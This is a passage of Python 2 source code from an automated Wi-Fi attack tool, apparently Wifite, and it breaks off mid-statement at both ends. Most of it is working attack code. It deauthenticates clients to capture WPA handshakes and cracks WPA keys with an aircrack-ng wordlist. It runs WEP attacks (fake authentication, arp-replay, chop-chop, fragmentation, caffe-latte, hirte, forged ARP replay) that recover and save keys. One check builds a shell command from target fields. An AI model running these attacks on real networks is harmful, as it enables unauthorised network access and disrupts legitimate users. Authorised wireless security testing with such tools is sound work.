save_as)\n\n                    print '\\n %s %shandshake captured%s! saved as \"%s\"' % (\n                    GR + sec_to_hms(seconds_running) + W, G, W, G + save_as + W)\n                    self.RUN_CONFIG.WPA_FINDINGS.append(\n                        '%s (%s) handshake captured' % (self.target.ssid, self.target.bssid))\n                    self.RUN_CONFIG.WPA_FINDINGS.append('saved as %s' % (save_as))\n                    self.RUN_CONFIG.WPA_FINDINGS.append('')\n\n                    # Strip handshake if needed\n                    if self.RUN_CONFIG.WPA_STRIP_HANDSHAKE: self.strip_handshake(save_as)\n\n                    # Add the filename and SSID to the list of 'to-crack'\n                    # Cracking will be handled after all attacks are finished.\n                    self.RUN_CONFIG.WPA_CAPS_TO_CRACK.append(CapFile(save_as, self.target.ssid, self.target.bssid))\n\n                    break  # Break out of while loop\n\n                # No handshake yet\n                os.remove(temp_cap_file)\n\n                # Check the airodump output file for new clients\n                for client in self.RUN_CONFIG.RUN_ENGINE.parse_csv(csv_file)[1]:\n                    if client.station != self.target.bssid: continue\n                    new_client = True\n                    for c in target_clients:\n                        if client.bssid == c.bssid:\n                            new_client = False\n                            break\n\n                    if new_client:\n                        print \" %s %snew client%s found: %s                         \" % \\\n                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W, G, W, \\\n                               G + client.bssid + W)\n                        target_clients.append(client)\n\n            # End of Handshake wait loop.\n\n            if not got_handshake:\n                print R + ' [0:00:00]' + O + ' unable to capture handshake in time' + W\n\n        except KeyboardInterrupt:\n            print R + '\\n (^C)' + O + ' WPA handshake capture interrupted' + W\n            if attack_interrupted_prompt():\n                remove_airodump_files(file_prefix)\n                send_interrupt(proc_read)\n                send_interrupt(proc_deauth)\n                print ''\n                self.RUN_CONFIG.exit_gracefully(0)\n\n\n        # clean up\n        remove_airodump_files(file_prefix)\n        send_interrupt(proc_read)\n        send_interrupt(proc_deauth)\n\n        return got_handshake\n\n    def has_handshake_tshark(self, target, capfile):\n        \"\"\"\n            Uses TShark to check for a handshake.\n            Returns \"True\" if handshake is found, false otherwise.\n        \"\"\"\n        if program_exists('tshark'):\n            # Call Tshark to return list of EAPOL packets in cap file.\n            cmd = ['tshark',\n                   '-r', capfile,  # Input file\n                   '-R', 'eapol',  # Filter (only EAPOL packets)\n                   '-2', # -R is deprecated and requires -2\n                   '-n']  # Do not resolve names (MAC vendors)\n            proc = Popen(cmd, stdout=PIPE, stderr=DN)\n            proc.wait()\n            lines = proc.communicate()[0].split('\\n')\n\n            # Get list of all clients in cap file\n            clients = []\n            for line in lines:\n                if line.find('appears to have been cut short') != -1 or line.find(\n                        'Running as user \"root\"') != -1 or line.strip() == '':\n                    continue\n\n                while line.startswith(' '):  line = line[1:]\n                while line.find('  ') != -1: line = line.replace('  ', ' ')\n\n                fields = line.split(' ')\n                # ensure tshark dumped correct info\n                if len(fields) < 5:\n                    continue\n\n                src = fields[2].lower()\n                dst = fields[4].lower()\n\n                if src == target.bssid.lower() and clients.count(dst) == 0:\n                    clients.append(dst)\n                elif dst == target.bssid.lower() and clients.count(src) == 0:\n                    clients.append(src)\n\n            # Check each client for a handshake\n            for client in clients:\n                msg_num = 1  # Index of message in 4-way handshake (starts at 1)\n\n                for line in lines:\n                    if line.find('appears to have been cut short') != -1: continue\n                    if line.find('Running as user \"root\"') != -1: continue\n                    if line.strip() == '': continue\n\n                    # Sanitize tshark's output, separate into fields\n                    while line[0] == ' ': line = line[1:]\n                    while line.find('  ') != -1: line = line.replace('  ', ' ')\n\n                    fields = line.split(' ')\n\n                    # Sometimes tshark doesn't display the full header for \"Key (msg 3/4)\" on the 3rd handshake.\n                    # This catches this glitch and fixes it.\n                    if len(fields) < 8:\n                        continue\n                    elif len(fields) == 8:\n                        fields.append('(msg')\n                        fields.append('3/4)')\n\n                    src = fields[2].lower()  # Source MAC address\n                    dst = fields[4].lower()  # Destination MAC address\n                    if len(fields) == 12:\n                        # \"Message x of y\" format\n                        msg = fields[9][0]\n                    else:\n                        msg = fields[-1][0]\n\n                    # First, third msgs in 4-way handshake are from the target to client\n                    if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client):\n                        continue\n                    # Second, fourth msgs in 4-way handshake are from client to target\n                    elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client):\n                        continue\n\n                    # The messages must appear in sequential order.\n                    try:\n                        if int(msg) != msg_num: continue\n                    except ValueError:\n                        continue\n\n                    msg_num += 1\n\n                    # We need the first 4 messages of the 4-way handshake\n                    # Although aircrack-ng cracks just fine with only 3 of the messages...\n                    if msg_num >= 4:\n                        return True\n        return False\n\n    def has_handshake_cowpatty(self, target, capfile, nonstrict=True):\n        \"\"\"\n            Uses cowpatty to check for a handshake.\n            Returns \"True\" if handshake is found, false otherwise.\n        \"\"\"\n        if not program_exists('cowpatty'): return False\n\n        # Call cowpatty to check if capfile contains a valid handshake.\n        cmd = ['cowpatty',\n               '-r', capfile,  # input file\n               '-s', target.ssid,  # SSID\n               '-c']  # Check for handshake\n        # Uses frames 1, 2, or 3 for key attack\n        if nonstrict: cmd.append('-2')\n        proc = Popen(cmd, stdout=PIPE, stderr=DN)\n        proc.wait()\n        response = proc.communicate()[0]\n        if response.find('incomplete four-way handshake exchange') != -1:\n            return False\n        elif response.find('Unsupported or unrecognized pcap file.') != -1:\n            return False\n        elif response.find('Unable to open capture file: Success') != -1:\n            return False\n        return True\n\n    def has_handshake_pyrit(self, target, capfile):\n        \"\"\"\n            Uses pyrit to check for a handshake.\n            Returns \"True\" if handshake is found, false otherwise.\n        \"\"\"\n        if not program_exists('pyrit'): return False\n\n        # Call pyrit to \"Analyze\" the cap file's handshakes.\n        cmd = ['pyrit',\n               '-r', capfile,\n               'analyze']\n        proc = Popen(cmd, stdout=PIPE, stderr=DN)\n        proc.wait()\n        hit_essid = False\n        for line in proc.communicate()[0].split('\\n'):\n            # Iterate over every line of output by Pyrit\n            if line == '' or line == None: continue\n            if line.find(\"AccessPoint\") != -1:\n                hit_essid = (line.find(\"('\" + target.ssid + \"')\") != -1) and \\\n                            (line.lower().find(target.bssid.lower()) != -1)\n                #hit_essid = (line.lower().find(target.bssid.lower()))\n\n            else:\n                # If Pyrit says it's good or workable, it's a valid handshake.\n                if hit_essid and (line.find(', good, ') != -1 or line.find(', good*, ') != -1 or line.find(', workable, ') != -1):\n                    return True\n        return False\n\n    def has_handshake_aircrack(self, target, capfile):\n        \"\"\"\n            Uses aircrack-ng to check for handshake.\n            Returns True if found, False otherwise.\n        \"\"\"\n        if not program_exists('aircrack-ng'): return False\n        crack = 'echo \"\" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile\n        proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)\n        proc_crack.wait()\n        txt = proc_crack.communicate()[0]\n\n        return (txt.find('Passphrase not in dictionary') != -1)\n\n    def has_handshake(self, target, capfile):\n        \"\"\"\n            Checks if .cap file contains a handshake.\n            Returns True if handshake is found, False otherwise.\n        \"\"\"\n        valid_handshake = True\n        tried = False\n        if self.RUN_CONFIG.WPA_HANDSHAKE_TSHARK:\n            tried = True\n            valid_handshake = self.has_handshake_tshark(target, capfile)\n\n        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:\n            tried = True\n            valid_handshake = self.has_handshake_cowpatty(target, capfile)\n\n        # Use CowPatty to check for handshake.\n        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:\n            tried = True\n            valid_handshake = self.has_handshake_cowpatty(target, capfile)\n\n        # Check for handshake using Pyrit if applicable\n        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_PYRIT:\n            tried = True\n            valid_handshake = self.has_handshake_pyrit(target, capfile)\n\n        # Check for handshake using aircrack-ng\n        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_AIRCRACK:\n            tried = True\n            valid_handshake = self.has_handshake_aircrack(target, capfile)\n\n        if tried: return valid_handshake\n        print R + ' [!]' + O + ' unable to check for handshake: all handshake options are disabled!'\n        self.RUN_CONFIG.exit_gracefully(1)\n\n    def strip_handshake(self, capfile):\n        \"\"\"\n            Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file\n            File in location 'capfile' is overwritten!\n        \"\"\"\n        output_file = capfile\n        if program_exists('pyrit'):\n            cmd = ['pyrit',\n                   '-r', capfile,\n                   '-o', capfile + '.temp',\n                   'stripLive']\n            call(cmd, stdout=DN, stderr=DN)\n            if os.path.exists(capfile + '.temp'):\n                rename(capfile + '.temp', output_file)\n\n        elif program_exists('tshark'):\n            # strip results with tshark\n            cmd = ['tshark',\n                   '-r', capfile,  # input file\n                   '-R', 'eapol || wlan_mgt.tag.interpretation',  # filter\n                   '-2', # -R is deprecated and requires -2\n                   '-w', capfile + '.temp']  # output file\n            proc_strip = call(cmd, stdout=DN, stderr=DN)\n\n            rename(capfile + '.temp', output_file)\n\n        else:\n            print R + \" [!]\" + O + \" unable to strip .cap file: neither pyrit nor tshark were found\" + W\n\n\n##########################\n# WPA CRACKING FUNCTIONS #\n##########################\ndef wpa_crack(capfile, RUN_CONFIG):\n    \"\"\"\n        Cracks cap file using aircrack-ng\n        This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,\n        they can do so manually.\n    \"\"\"\n    if RUN_CONFIG.WPA_DICTIONARY == '':\n        print R + ' [!]' + O + ' no WPA dictionary found! use -dict <file> command-line argument' + W\n        return False\n\n    print GR + ' [0:00:00]' + W + ' cracking %s with %s' % (G + capfile.ssid + W, G + 'aircrack-ng' + W)\n    start_time = time.time()\n    cracked = False\n\n    remove_file(RUN_CONFIG.temp + 'out.out')\n    remove_file(RUN_CONFIG.temp + 'wpakey.txt')\n\n    cmd = ['aircrack-ng',\n           '-a', '2',  # WPA crack\n           '-w', RUN_CONFIG.WPA_DICTIONARY,  # Wordlist\n           '-l', RUN_CONFIG.temp + 'wpakey.txt',  # Save key to file\n           '-b', capfile.bssid,  # BSSID of target\n           capfile.filename]\n\n    proc = Popen(cmd, stdout=open(RUN_CONFIG.temp + 'out.out', 'a'), stderr=DN)\n    try:\n        kt = 0  # Keys tested\n        kps = 0  # Keys per second\n        while True:\n            time.sleep(1)\n\n            if proc.poll() != None:  # aircrack stopped\n                if os.path.exists(RUN_CONFIG.temp + 'wpakey.txt'):\n                    # Cracked\n                    inf = open(RUN_CONFIG.temp + 'wpakey.txt')\n                    key = inf.read().strip()\n                    inf.close()\n                    RUN_CONFIG.WPA_FINDINGS.append('cracked wpa key for \"%s\" (%s): \"%s\"' % (\n                    G + capfile.ssid + W, G + capfile.bssid + W, C + key + W))\n                    RUN_CONFIG.WPA_FINDINGS.append('')\n                    t = Target(capfile.bssid, 0, 0, 0, 'WPA', capfile.ssid)\n                    t.key = key\n                    RUN_CONFIG.save_cracked(t)\n\n                    print GR + '\\n [+]' + W + ' cracked %s (%s)!' % (G + capfile.ssid + W, G + capfile.bssid + W)\n                    print GR + ' [+]' + W + ' key:    \"%s\"\\n' % (C + key + W)\n                    cracked = True\n                else:\n                    # Did not crack\n                    print R + '\\n [!]' + R + 'crack attempt failed' + O + ': passphrase not in dictionary' + W\n                break\n\n            inf = open(RUN_CONFIG.temp + 'out.out', 'r')\n            lines = inf.read().split('\\n')\n            inf.close()\n            outf = open(RUN_CONFIG.temp + 'out.out', 'w')\n            outf.close()\n            for line in lines:\n                i = line.find(']')\n                j = line.find('keys tested', i)\n                if i != -1 and j != -1:\n                    kts = line[i + 2:j - 1]\n                    try:\n                        kt = int(kts)\n                    except ValueError:\n                        pass\n                i = line.find('(')\n                j = line.find('k/s)', i)\n                if i != -1 and j != -1:\n                    kpss = line[i + 1:j - 1]\n                    try:\n                        kps = float(kpss)\n                    except ValueError:\n                        pass\n\n            print \"\\r %s %s keys tested (%s%.2f keys/sec%s)   \" % \\\n                  (GR + sec_to_hms(time.time() - start_time) + W, G + add_commas(kt) + W, G, kps, W),\n            stdout.flush()\n\n    except KeyboardInterrupt:\n        print R + '\\n (^C)' + O + ' WPA cracking interrupted' + W\n\n    send_interrupt(proc)\n    try:\n        os.kill(proc.pid, SIGTERM)\n    except OSError:\n        pass\n\n    return cracked\n\n\ndef add_commas(n):\n    \"\"\"\n        Receives integer n, returns string representation of n with commas in thousands place.\n        I'm sure there's easier ways of doing this... but meh.\n    \"\"\"\n    strn = str(n)\n    lenn = len(strn)\n    i = 0\n    result = ''\n    while i < lenn:\n        if (lenn - i) % 3 == 0 and i != 0: result += ','\n        result += strn[i]\n        i += 1\n    return result\n\n\n#################\n# WEP FUNCTIONS #\n#################\nclass WEPAttack(Attack):\n    def __init__(self, iface, target, clients, config):\n        self.iface = iface\n        self.target = target\n        self.clients = clients\n        self.RUN_CONFIG = config\n\n    def RunAttack(self):\n        '''\n            Abstract method for dispatching the WEP crack\n        '''\n        self.attack_wep()\n\n    def EndAttack(self):\n        '''\n            Abstract method for ending the WEP attack\n        '''\n        pass\n\n    def attack_wep(self):\n        \"\"\"\n        Attacks WEP-encrypted network.\n        Returns True if key was successfully found, False otherwise.\n        \"\"\"\n        if self.RUN_CONFIG.WEP_TIMEOUT <= 0: self.RUN_CONFIG.WEP_TIMEOUT = -1\n\n        total_attacks = 6  # 4 + (2 if len(clients) > 0 else 0)\n        if not self.RUN_CONFIG.WEP_ARP_REPLAY: total_attacks -= 1\n        if not self.RUN_CONFIG.WEP_CHOPCHOP:   total_attacks -= 1\n        if not self.RUN_CONFIG.WEP_FRAGMENT:   total_attacks -= 1\n        if not self.RUN_CONFIG.WEP_CAFFELATTE: total_attacks -= 1\n        if not self.RUN_CONFIG.WEP_P0841:      total_attacks -= 1\n        if not self.RUN_CONFIG.WEP_HIRTE:      total_attacks -= 1\n\n        if total_attacks <= 0:\n            print R + ' [!]' + O + ' unable to initiate WEP attacks: no attacks are selected!'\n            return False\n        remaining_attacks = total_attacks\n\n        print ' %s preparing attack \"%s\" (%s)' % \\\n              (GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.ssid + W, G + self.target.bssid + W)\n\n        file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wep')\n        wepkey_file = os.path.join(self.RUN_CONFIG.temp, 'wepkey.txt')\n        csv_file = file_prefix + '-01.csv'\n        cap_file = file_prefix + '-01.cap'\n\n        remove_airodump_files(file_prefix)\n        remove_file(wepkey_file)\n\n        # Start airodump process to capture packets\n        cmd_airodump = ['airodump-ng',\n                        '-w', file_prefix,  # Output file name (wep-01.cap, wep-01.csv)\n                        '-c', self.target.channel,  # Wireless channel\n                        '--write-interval', '1',\n                        '--bssid', self.target.bssid,\n                        self.iface]\n        proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)\n        proc_aireplay = None\n        proc_aircrack = None\n\n        successful = False  # Flag for when attack is successful\n        started_cracking = False  # Flag for when we have started aircrack-ng\n        client_mac = ''  # The client mac we will send packets to/from\n\n        total_ivs = 0\n        ivs = 0\n        last_ivs = 0\n        for attack_num in xrange(0, 6):\n\n            # Skip disabled attacks\n            if attack_num == 0 and not self.RUN_CONFIG.WEP_ARP_REPLAY:\n                continue\n            elif attack_num == 1 and not self.RUN_CONFIG.WEP_CHOPCHOP:\n                continue\n            elif attack_num == 2 and not self.RUN_CONFIG.WEP_FRAGMENT:\n                continue\n            elif attack_num == 3 and not self.RUN_CONFIG.WEP_CAFFELATTE:\n                continue\n            elif attack_num == 4 and not self.RUN_CONFIG.WEP_P0841:\n                continue\n            elif attack_num == 5 and not self.RUN_CONFIG.WEP_HIRTE:\n                continue\n\n            remaining_attacks -= 1\n\n            try:\n\n                if self.wep_fake_auth(self.iface, self.target, sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)):\n                    # Successful fake auth\n                    client_mac = self.RUN_CONFIG.THIS_MAC\n                elif not self.RUN_CONFIG.WEP_IGNORE_FAKEAUTH:\n                    send_interrupt(proc_aireplay)\n                    send_interrupt(proc_airodump)\n                    print R + ' [!]' + O + ' unable to fake-authenticate with target'\n                    print R + ' [!]' + O + ' to skip this speed bump, select \"ignore-fake-auth\" at command-line'\n                    return False\n\n                remove_file(os.path.join(self.RUN_CONFIG.temp, 'arp.cap'))\n                # Generate the aireplay-ng arguments based on attack_num and other params\n                cmd = self.get_aireplay_command(self.iface, attack_num, self.target, self.clients, client_mac)\n                if cmd == '': continue\n                if proc_aireplay != None:\n                    send_interrupt(proc_aireplay)\n                proc_aireplay = Popen(cmd, stdout=PIPE, stderr=PIPE)\n\n                print '\\r %s attacking \"%s\" via' % (\n                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.ssid + W),\n                if attack_num == 0:\n                    print G + 'arp-replay',\n                elif attack_num == 1:\n                    print G + 'chop-chop',\n                elif attack_num == 2:\n                    print G + 'fragmentation',\n                elif attack_num == 3:\n                    print G + 'caffe-latte',\n                elif attack_num == 4:\n                    print G + 'p0841',\n                elif attack_num == 5:\n                    print G + 'hirte',\n                print 'attack' + W\n\n                print ' %s captured %s%d%s ivs @ %s iv/sec' % (\n                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G, total_ivs, W, G + '0' + W),\n                stdout.flush()\n\n                time.sleep(1)\n                if attack_num == 1:\n                    # Send a deauth packet to broadcast and all clients *just because!*\n                    self.wep_send_deauths(self.iface, self.target, self.clients)\n                last_deauth = time.time()\n\n                replaying = False\n                time_started = time.time()\n                while time.time() - time_started < self.RUN_CONFIG.WEP_TIMEOUT:\n                    # time.sleep(5)\n                    if self.RUN_CONFIG.WEP_TIMEOUT == -1:\n                        current_hms = \"[endless]\"\n                    else:\n                        current_hms = sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT - (time.time() - time_started))\n                    print \"\\r %s\\r\" % (GR + current_hms + W),\n                    stdout.flush()\n                    time.sleep(1)\n\n                    # Calculates total seconds remaining\n\n                    # Check number of IVs captured\n                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(csv_file)[0]\n                    if len(csv) > 0:\n                        ivs = int(csv[0].data)\n                        print \"\\r                                                   \",\n                        print \"\\r %s captured %s%d%s ivs @ %s%d%s iv/sec\" % \\\n                              (GR + current_hms + W, G, total_ivs + ivs, W, G, (ivs - last_ivs), W),\n\n                        if ivs - last_ivs == 0 and time.time() - last_deauth > 30:\n                            print \"\\r %s deauthing to generate packets...\" % (GR + current_hms + W),\n                            self.wep_send_deauths(self.iface, self.target, self.clients)\n                            print \"done\\r\",\n                            last_deauth = time.time()\n\n                        last_ivs = ivs\n                        stdout.flush()\n                        if total_ivs + ivs >= self.RUN_CONFIG.WEP_CRACK_AT_IVS and not started_cracking:\n                            # Start cracking\n                            cmd = ['aircrack-ng',\n                                   '-a', '1',\n                                   '-l', wepkey_file]\n                            #temp + 'wep-01.cap']\n                            # Append all .cap files in temp directory (in case we are resuming)\n                            for f in os.listdir(self.RUN_CONFIG.temp):\n                                if f.startswith('wep-') and f.endswith('.cap'):\n                                    cmd.append(os.path.join(self.RUN_CONFIG.temp, f))\n\n                            print \"\\r %s started %s (%sover %d ivs%s)\" % (\n                            GR + current_hms + W, G + 'cracking' + W, G, self.RUN_CONFIG.WEP_CRACK_AT_IVS, W)\n                            proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)\n                            started_cracking = True\n\n                    # Check if key has been cracked yet.\n                    if os.path.exists(wepkey_file):\n                        # Cracked!\n                        infile = open(wepkey_file, 'r')\n                        key = infile.read().replace('\\n', '')\n                        infile.close()\n                        print '\\n\\n %s %s %s (%s)! key: \"%s\"' % (\n                        current_hms, G + 'cracked', self.target.ssid + W, G + self.target.bssid + W, C + key + W)\n                        self.RUN_CONFIG.WEP_FINDINGS.append(\n                            'cracked %s (%s), key: \"%s\"' % (self.target.ssid, self.target.bssid, key))\n                        self.RUN_CONFIG.WEP_FINDINGS.append('')\n\n                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)\n                        t.key = key\n                        self.RUN_CONFIG.save_cracked(t)\n\n                        # Kill processes\n                        send_interrupt(proc_airodump)\n                        send_interrupt(proc_aireplay)\n                        try:\n                            os.kill(proc_aireplay, SIGTERM)\n                        except:\n                            pass\n                        send_interrupt(proc_aircrack)\n                        # Remove files generated by airodump/aireplay/packetforce\n                        time.sleep(0.5)\n                        remove_airodump_files(file_prefix)\n                        remove_file(wepkey_file)\n                        return True\n\n                    # Check if aireplay is still executing\n                    if proc_aireplay.poll() == None:\n                        if replaying:\n                            print ', ' + G + 'replaying         \\r' + W,\n                        elif attack_num == 1 or attack_num == 2:\n                            print ', waiting for packet    \\r',\n                        stdout.flush()\n                        continue\n\n                    # At this point, aireplay has stopped\n                    if attack_num != 1 and attack_num != 2:\n                        print '\\r %s attack failed: %saireplay-ng exited unexpectedly%s' % (R + current_hms, O, W)\n                        (sout, serr) = proc_aireplay.communicate()\n                        break  # Break out of attack's While loop\n\n                    # Check for a .XOR file (we expect one when doing chopchop/fragmentation\n                    xor_file = ''\n                    for filename in sorted(os.listdir(self.RUN_CONFIG.temp)):\n                        if filename.lower().endswith('.xor'):\n                            xor_file = os.path.join(self.RUN_CONFIG.temp, filename)\n                    if xor_file == '':\n                        print '\\r %s attack failed: %sunable to generate keystream        %s' % (R + current_hms, O, W)\n                        break\n\n                    remove_file(os.path.join(self.RUN_CONFIG.temp, 'arp.cap'))\n                    cmd = ['packetforge-ng',\n                           '-0',\n                           '-a', self.target.bssid,\n                           '-h', client_mac,\n                           '-k', '192.168.1.2',\n                           '-l', '192.168.1.100',\n                           '-y', xor_file,\n                           '-w', os.path.join(self.RUN_CONFIG.temp, 'arp.cap'),\n                           self.iface]\n                    proc_pforge = Popen(cmd, stdout=PIPE, stderr=DN)\n                    proc_pforge.wait()\n                    forged_packet = proc_pforge.communicate()[0]\n                    remove_file(xor_file)\n                    if forged_packet == None: result = ''\n                    forged_packet = forged_packet.strip()\n                    if not forged_packet.find('Wrote packet'):\n                        print \"\\r %s attack failed: unable to forget ARP packet               %s\" % (\n                        R + current_hms + O, W)\n                        break\n\n                    # We were able to forge a packet, so let's replay it via aireplay-ng\n                    cmd = ['aireplay-ng',\n                           '--ignore-negative-one',\n                           '--arpreplay',\n                           '-b', self.target.bssid,\n                           '-r', os.path.join(self.RUN_CONFIG.temp, 'arp.cap'),  # Used the forged ARP packet\n                           '-F',  # Select the first packet\n                           self.iface]\n                    proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)\n\n                    print '\\r %s forged %s! %s...         ' % (\n                    GR + current_hms + W, G + 'arp packet' + W, G + 'replaying' + W)\n                    replaying = True\n\n                # After the attacks, if we are already cracking, wait for the key to be found!\n                while started_cracking:  # ivs > WEP_CRACK_AT_IVS:\n                    time.sleep(1)\n                    # Check number of IVs captured\n                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(csv_file)[0]\n                    if len(csv) > 0:\n                        ivs = int(csv[0].data)\n                        print GR + \" [endless]\" + W + \" captured %s%d%s ivs, iv/sec: %s%d%s  \\r\" % \\\n                                                      (G, total_ivs + ivs, W, G, (ivs - last_ivs), W),\n                        last_ivs = ivs\n                        stdout.flush()\n\n                    # Check if key has been cracked yet.\n                    if os.path.exists(wepkey_file):\n                        # Cracked!\n                        infile = open(wepkey_file, 'r')\n                        key = infile.read().replace('\\n', '')\n                        infile.close()\n                        print GR + '\\n\\n [endless] %s %s (%s)! key: \"%s\"' % (\n                        G + 'cracked', self.target.ssid + W, G + self.target.bssid + W, C + key + W)\n                        self.RUN_CONFIG.WEP_FINDINGS.append(\n                            'cracked %s (%s), key: \"%s\"' % (self.target.ssid, self.target.bssid, key))\n                        self.RUN_CONFIG.WEP_FINDINGS.append('')\n\n                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)\n                        t.key = key\n                        self.RUN_CONFIG.save_cracked(t)\n\n                        # Kill processes\n                        send_interrupt(proc_airodump)\n                        send_interrupt(proc_aireplay)\n                        send_interrupt(proc_aircrack)\n                        # Remove files generated by airodump/aireplay/packetforce\n                        remove_airodump_files(file_prefix)\n                        remove_file(wepkey_file)\n                        return True\n\n            # Keyboard interrupt during attack\n            except KeyboardInterrupt:\n                print R + '\\n (^C)' + O + ' WEP attack interrupted\\n' + W\n\n                send_interrupt(proc_airodump)\n                if proc_aireplay != None:\n                    send_interrupt(proc_aireplay)\n                if proc_aircrack != None:\n                    send_interrupt(proc_aircrack)\n\n                options = []\n                selections = []\n                if remaining_attacks > 0:\n                    options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \\\n                                   (G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))\n                    selections.append(G + 'c' + W)\n\n                if self.RUN_CONFIG.TARGETS_REMAINING > 0:\n                    options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \\\n                                   (O, W, self.RUN_CONFIG.TARGETS_REMAINING,\n                                    's' if self.RUN_CONFIG.TARGETS_REMAINING != 1 else ''))\n                    selections.append(O + 's' + W)\n\n                options.append('%sexit%s     the program completely' % (R, W))\n                selections.append(R + 'e' + W)\n\n                if len(options) > 1:\n                    # Ask user what they want to do, Store answer in \"response\"\n                    print GR + ' [+]' + W + ' what do you want to do?'\n                    response = ''\n                    while response != 'c' and response != 's' and response != 'e':\n                        for option in options:\n                            print '     %s' % option\n                        response = raw_input(\n                            GR + ' [+]' + W + ' please make a selection (%s): ' % (', '.join(selections))).lower()[0]\n                else:\n                    response = 'e'\n\n                if response == 'e' or response == 's':\n                    # Exit or skip target (either way, stop this attack)\n                    if self.RUN_CONFIG.WEP_SAVE:\n                        # Save packets\n                        save_as = re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) + '_' + self.target.bssid.replace(':',\n                                                                                                                  '-') + '.cap' + W\n                        try:\n                            rename(cap_file, save_as)\n                        except OSError:\n                            print R + ' [!]' + O + ' unable to save capture file!' + W\n                        else:\n                            print GR + ' [+]' + W + ' packet capture ' + G + 'saved' + W + ' to ' + G + save_as + W\n\n                    # Remove files generated by airodump/aireplay/packetforce\n                    for filename in os.listdir('.'):\n                        if filename.startswith('replay_arp-') and filename.endswith('.cap'):\n                            remove_file(filename)\n                    remove_airodump_files(file_prefix)\n                    remove_file(wepkey_file)\n                    print ''\n                    if response == 'e':\n                        self.RUN_CONFIG.exit_gracefully(0)\n                    return\n\n                elif response == 'c':\n                    # Continue attacks\n                    # Need to backup temp/wep-01.cap and remove airodump files\n                    i = 2\n                    while os.path.exists(os.path.join(self.RUN_CONFIG.temp, 'wep-' + str(i) + '.cap')):\n                        i += 1\n                    new_cap_file = os.path.join(self.RUN_CONFIG.temp, 'wep-' + str(i) + '.cap')\n                    copy(cap_file, new_cap_file)\n                    remove_airodump_files(file_prefix)\n\n                    # Need to restart airodump-ng, as it's been interrupted/killed\n                    proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)\n\n                    # Say we haven't started cracking yet, so we re-start if needed.\n                    started_cracking = False\n\n                    # Reset IVs counters for proper behavior\n                    total_ivs += ivs\n                    ivs = 0\n                    last_ivs = 0\n\n                    # Also need to remember to crack \"temp/*.cap\" instead of just wep-01.cap\n                    pass\n\n        if successful:\n            print GR + '\\n [0:00:00]' + W + ' attack complete: ' + G + 'success!' + W\n        else:\n            print GR + '\\n [0:00:00]' + W + ' attack complete: ' + R + 'failure' + W\n\n        send_interrupt(proc_airodump)\n        if proc_aireplay != None:\n            send_interrupt(proc_aireplay)\n\n        # Remove files generated by airodump/aireplay/packetforce\n        for filename in os.listdir('.'):\n            if filename.startswith('replay_arp-') and filename.endswith('.cap'):\n                remove_file(filename)\n        remove_airodump_files(file_prefix)\n        remove_file(wepkey_file)\n\n    def wep_fake_auth(self, iface, target, time_to_display):\n        \"\"\"\n            Attempt to (falsely) authenticate with a WEP access point.\n            Gives 3 seconds to make each 5 authentication attempts.\n            Returns True if authentication was successful, False otherwise.\n        \"\"\"\n        max_wait = 3  # Time, in seconds, to allow each fake authentication\n        max_attempts = 5  # Number of attempts to make\n\n        for fa_index in xrange(1, max_attempts + 1):\n            print '\\r                                                            ',\n            print '\\r %s attempting %sfake authentication%s (%d/%d)... ' % \\\n                  (GR + time_to_display + W, G, W, fa_index, max_attempts),\n            stdout.flush()\n\n            cmd = ['aireplay-ng',\n                   '--ignore-negative-one',\n                   '-1', '0',  # Fake auth, no delay\n                   '-a', target.bssid,\n                   '-T', '1']  # Make 1 attempt\n            if target.ssid != '':\n                cmd.append('-e')\n                cmd.append(target.ssid)\n            cmd.append(iface)\n\n            proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)\n            started = time.time()\n            while proc_fakeauth.poll() == None and time.time() - started <= max_wait:\n                time.sleep(0.1)\n\n            if time.time() - started > max_wait:\n                send_interrupt(proc_fakeauth)\n                print R + 'failed' + W,\n                stdout.flush()\n                time.sleep(0.5)\n                continue\n\n            result = proc_fakeauth.communicate()[0].lower()\n            if result.find('switching to shared key') != -1 or \\\n                    result.find('rejects open system'): pass\n            if result.find('association successful') != -1:\n                print G + 'success!' + W\n                return True\n\n            print R + 'failed' + W,\n            stdout.flush()\n            time.sleep(0.5)\n            continue\n        print ''\n        return False\n\n    def get_aireplay_command(self, iface, attack_num, target, clients, client_mac):\n        \"\"\"\n            Returns aireplay-ng command line arguments based on parameters.\n        \"\"\"\n        cmd = ''\n        if attack_num == 0:\n            cmd = ['aireplay-ng',\n                   '--ignore-negative-one',\n                   '--arpreplay',\n                   '-b', target.bssid,\n                   '-x', str(self.RUN_CONFIG.WEP_PPS)]  # Packets per second\n            if client_mac != '':\n                cmd.append('-h')\n                cmd.append(client_mac)\n            elif len(clients) > 0:\n                cmd.append('-h')\n                cmd.append(clients[0].bssid)\n            cmd.append(iface)\n\n        elif attack_num == 1:\n            cmd = ['aireplay-ng',\n                   